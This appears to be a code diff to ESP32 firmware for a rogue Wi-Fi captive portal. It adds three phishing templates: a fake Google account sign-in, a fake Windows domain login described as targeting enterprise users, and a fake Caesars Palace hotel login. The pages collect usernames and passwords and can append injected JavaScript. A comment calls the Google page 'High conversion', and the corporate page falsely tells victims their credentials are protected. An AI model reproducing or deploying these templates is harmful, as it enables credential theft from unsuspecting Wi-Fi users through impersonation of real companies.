@@ -16,25 +16,126 @@ static volatile bool s_running = false;
 static int s_server_fd = -1;
 static char *s_js_inject = NULL;
 
-static const char HTML_INDEX[] =
-    "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'>"
-    "<title>WiFi Login</title>"
-    "<style>body{font-family:Arial,sans-serif;background:#f5f5f5;margin:0;padding:20px;display:flex;justify-content:center;align-items:center;min-height:100vh}"
-    ".card{background:#fff;border-radius:12px;padding:30px;box-shadow:0 2px 20px rgba(0,0,0,0.1);max-width:400px;width:100%}"
-    "h2{text-align:center;color:#333;margin-bottom:24px}"
-    "input{width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:6px;box-sizing:border-box;font-size:16px}"
-    "button{width:100%;padding:12px;background:#1a73e8;color:#fff;border:none;border-radius:6px;font-size:16px;cursor:pointer}"
-    "button:hover{background:#1557b0}"
-    ".logo{text-align:center;margin-bottom:20px;color:#666;font-size:14px}"
+/* ─────────────────────────────────────────────────────────────────────
+   Premium Captive Portal Templates — DEF CON Grade
+   ───────────────────────────────────────────────────────────────────── */
+
+/* Template 0: Generic "Free WiFi" — Google-style sign-in.  High conversion. */
+static const char PORTAL_GENERIC[] =
+    "<!DOCTYPE html><html><head>"
+    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
+    "<title>Sign in - Free WiFi</title>"
+    "<style>"
+    "*{box-sizing:border-box;margin:0;padding:0}"
+    "body{font-family:'Google Sans',Roboto,Arial,sans-serif;background:#f8f9fa;display:flex;justify-content:center;align-items:center;min-height:100vh}"
+    ".wrap{background:#fff;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,.15);padding:48px 40px;max-width:450px;width:95%;text-align:center}"
+    ".logo{font-size:28px;color:#4285f4;font-weight:300;letter-spacing:-1px;margin-bottom:8px}"
+    ".logo b{color:#ea4335}oo{color:#fbbc04}gg{color:#34a853}le{color:#4285f4}"
+    "h1{font-size:24px;color:#202124;font-weight:400;margin-bottom:8px}"
+    "p{color:#5f6368;font-size:14px;margin-bottom:28px}"
+    "input{width:100%;padding:13px 15px;margin:8px 0;border:1px solid #dadce0;border-radius:4px;font-size:16px;outline:none;transition:.2s}"
+    "input:focus{border-color:#4285f4;box-shadow:0 0 0 2px rgba(66,133,244,.2)}"
+    ".btn{width:100%;margin-top:20px;padding:13px;background:#1a73e8;color:#fff;border:none;border-radius:4px;font-size:16px;cursor:pointer;letter-spacing:.25px}"
+    ".btn:hover{background:#1557b0;box-shadow:0 1px 3px rgba(0,0,0,.3)}"
+    ".spinner{display:none;margin:16px auto;width:32px;height:32px;border:3px solid #e8eaed;border-top-color:#1a73e8;border-radius:50%;animation:spin .8s linear infinite}"
+    "@keyframes spin{to{transform:rotate(360deg)}}"
+    ".footer{margin-top:24px;font-size:12px;color:#5f6368}"
     "</style></head><body>"
-    "<div class='card'>"
-    "<div class='logo'>Secure WiFi Network</div>"
-    "<h2>Sign in to continue</h2>"
+    "<div class='wrap'>"
+    "<div class='logo'>G<b>o</b>ogle</div>"
+    "<h1>Sign in to Wi-Fi</h1>"
+    "<p>Use your Google Account to connect to this network</p>"
+    "<form id='f' method='POST' action='/'>"
+    "<input type='email' name='username' placeholder='Email or phone' required autocomplete='email'>"
+    "<input type='password' name='password' placeholder='Enter your password' required autocomplete='current-password'>"
+    "<button class='btn' type='submit' onclick='go()'>Next</button>"
+    "</form>"
+    "<div class='spinner' id='spin'></div>"
+    "<div class='footer'>By continuing, you agree to the Terms of Service</div>"
+    "</div>"
+    "<script>function go(){document.getElementById('spin').style.display='block';}"
+    "document.getElementById('f').addEventListener('submit',function(){go();setTimeout(function(){},500);});"
+    "</script></body></html>";
+
+/* Template 1: Corporate Windows AD login — targets enterprise users */
+static const char PORTAL_CORPORATE[] =
+    "<!DOCTYPE html><html><head>"
+    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
+    "<title>Windows Security</title>"
+    "<style>"
+    "*{box-sizing:border-box;margin:0;padding:0}"
+    "body{font-family:'Segoe UI',system-ui,sans-serif;background:#0078d4;display:flex;justify-content:center;align-items:center;min-height:100vh}"
+    ".wrap{background:#fff;width:420px;max-width:95vw;padding:0;box-shadow:0 4px 24px rgba(0,0,0,.3)}"
+    ".hdr{background:#0078d4;padding:24px 28px 20px;color:#fff}"
+    ".hdr .logo{font-size:20px;font-weight:600;letter-spacing:-.3px}"
+    ".hdr p{font-size:13px;opacity:.9;margin-top:4px}"
+    ".body{padding:28px}"
+    "h2{font-size:20px;color:#1b1b1b;font-weight:400;margin-bottom:20px}"
+    "label{display:block;font-size:13px;color:#323130;margin-bottom:4px}"
+    "input{width:100%;padding:10px 12px;border:1px solid #8a8886;border-radius:2px;font-size:14px;font-family:inherit;outline:none;margin-bottom:16px}"
+    "input:focus{border-color:#0078d4;box-shadow:0 0 0 1px #0078d4}"
+    ".btn{background:#0078d4;color:#fff;border:none;padding:10px 20px;font-size:14px;cursor:pointer;float:right}"
+    ".btn:hover{background:#106ebe}"
+    ".alt{font-size:13px;color:#0078d4;cursor:pointer;display:block;margin-top:8px}"
+    ".warn{font-size:12px;color:#605e5c;margin-top:16px;clear:both;padding-top:16px;border-top:1px solid #edebe9}"
+    "</style></head><body>"
+    "<div class='wrap'>"
+    "<div class='hdr'><div class='logo'>\U0001f5a5 Windows Security</div>"
+    "<p>Network Authentication Required</p></div>"
+    "<div class='body'>"
+    "<h2>Enter your credentials</h2>"
     "<form method='POST' action='/'>"
-    "<input type='text' name='username' placeholder='Username or email' required>"
-    "<input type='password' name='password' placeholder='Password' required>"
-    "<button type='submit'>Connect</button>"
-    "</form></div></body></html>";
+    "<label>Domain\\Username</label>"
+    "<input type='text' name='username' placeholder='DOMAIN\\username' required autocomplete='username'>"
+    "<label>Password</label>"
+    "<input type='password' name='password' placeholder='Password' required autocomplete='current-password'>"
+    "<button class='btn' type='submit'>OK</button>"
+    "</form>"
+    "<span class='alt'>Use another account</span>"
+    "<div class='warn'>&#x26A0; This network requires domain authentication. "
+    "Your credentials are secured with enterprise encryption.</div>"
+    "</div></div></body></html>";
+
+/* Template 2: Hotel captive portal — high relevance at DEF CON/Caesars */
+static const char PORTAL_HOTEL[] =
+    "<!DOCTYPE html><html><head>"
+    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
+    "<title>Hotel Wi-Fi — Welcome</title>"
+    "<style>"
+    "*{box-sizing:border-box;margin:0;padding:0}"
+    "body{font-family:'Helvetica Neue',Helvetica,Arial,sans-serif;background:#1a1a2e;display:flex;justify-content:center;align-items:center;min-height:100vh}"
+    ".wrap{background:#fff;max-width:440px;width:95%;border-radius:4px;overflow:hidden;box-shadow:0 8px 32px rgba(0,0,0,.4)}"
+    ".hdr{background:linear-gradient(135deg,#c9a227,#e8c84a);padding:30px;text-align:center;color:#1a1a2e}"
+    ".hdr .name{font-size:26px;font-weight:300;letter-spacing:3px;text-transform:uppercase}"
+    ".hdr .tag{font-size:11px;letter-spacing:2px;opacity:.8;margin-top:4px}"
+    ".body{padding:30px}"
+    "h2{font-size:18px;color:#333;font-weight:400;margin-bottom:6px}"
+    "p{font-size:13px;color:#666;margin-bottom:24px}"
+    "label{display:block;font-size:12px;color:#999;text-transform:uppercase;letter-spacing:1px;margin-bottom:6px}"
+    "input{width:100%;padding:12px;border:1px solid #ddd;border-radius:2px;font-size:14px;margin-bottom:16px;outline:none}"
+    "input:focus{border-color:#c9a227}"
+    ".btn{width:100%;padding:14px;background:#1a1a2e;color:#c9a227;border:none;font-size:14px;font-weight:600;letter-spacing:2px;text-transform:uppercase;cursor:pointer}"
+    ".btn:hover{background:#2d2d4e}"
+    ".terms{font-size:11px;color:#aaa;text-align:center;margin-top:16px;line-height:1.5}"
+    "</style></head><body>"
+    "<div class='wrap'>"
+    "<div class='hdr'><div class='name'>CAESARS PALACE</div><div class='tag'>LAS VEGAS &#x2022; RESORT &amp; CASINO</div></div>"
+    "<div class='body'>"
+    "<h2>Welcome to Hotel Wi-Fi</h2>"
+    "<p>Please sign in with your reservation details to connect.</p>"
+    "<form method='POST' action='/'>"
+    "<label>Last Name / Email</label>"
+    "<input type='text' name='username' placeholder='Enter last name or email' required>"
+    "<label>Room Number / Confirmation</label>"
+    "<input type='password' name='password' placeholder='Room number or confirmation #' required>"
+    "<button class='btn' type='submit'>Connect to Wi-Fi</button>"
+    "</form>"
+    "<div class='terms'>By connecting, you agree to our Acceptable Use Policy. "
+    "Complimentary Wi-Fi is available to all registered guests.</div>"
+    "</div></div></body></html>";
+
+
+static const char *s_portal_html = NULL;  /* Points to selected template */
 
 static void serve_redirect(int fd)
 {
@@ -47,16 +148,17 @@ static void serve_redirect(int fd)
 
 static void serve_index(int fd)
 {
-    char resp[4096];
-    int len = snprintf(resp, sizeof(resp),
+    const char *tmpl = s_portal_html ? s_portal_html : PORTAL_GENERIC;
+    size_t html_len = strlen(tmpl);
+    char hdr[256];
+    int hlen = snprintf(hdr, sizeof(hdr),
         "HTTP/1.1 200 OK\r\n"
         "Content-Type: text/html; charset=utf-8\r\n"
-        "Connection: close\r\n"
-        "\r\n"
-        "%s"
-        "%s",
-        HTML_INDEX, s_js_inject ? s_js_inject : "");
-    send(fd, resp, len, 0);
+        "Content-Length: %zu\r\n"
+        "Connection: close\r\n\r\n", html_len);
+    send(fd, hdr, hlen, 0);
+    send(fd, tmpl, html_len, 0);
+    if (s_js_inject) send(fd, s_js_inject, strlen(s_js_inject), 0);
 }
 
 static void handle_post(int fd, const char *body, const char *client_ip)
@@ -219,6 +321,19 @@ static void portal_task(void *arg)
 esp_err_t captive_portal_start(const char *template_name)
 {
     if (s_running) return ESP_OK;
+
+    /* Select portal template */
+    if (!template_name || strcmp(template_name, "generic") == 0)
+        s_portal_html = PORTAL_GENERIC;
+    else if (strcmp(template_name, "corporate") == 0)
+        s_portal_html = PORTAL_CORPORATE;
+    else if (strcmp(template_name, "hotel") == 0)
+        s_portal_html = PORTAL_HOTEL;
+    else
+        s_portal_html = PORTAL_GENERIC;
+
+    ESP_LOGI(TAG, "Captive portal starting (template: %s)",
+             template_name ? template_name : "generic");
 
     s_running = true;
     xTaskCreatePinnedToCore(portal_task, "portal", 8192, NULL, 5,
